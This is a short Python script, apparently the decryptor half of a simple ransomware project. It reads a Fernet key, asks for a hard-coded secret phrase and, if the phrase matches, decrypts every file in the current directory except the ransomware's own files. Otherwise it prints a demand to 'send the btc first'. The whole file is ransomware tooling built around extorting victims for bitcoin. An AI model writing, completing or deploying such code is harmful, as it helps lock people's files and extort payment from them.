import os 
from cryptography.fernet import Fernet 

files = []

for file in os.listdir():
    if file == "fun.py" or file == "thekey.key" or file == "decript.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "basketball"

user_phrase = input("Enter the secret phrase to decrypt your files \n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("congrats, your files are now yours again thanks for your services")
else:
    print("sorry, wrong secret phrase send the btc first")




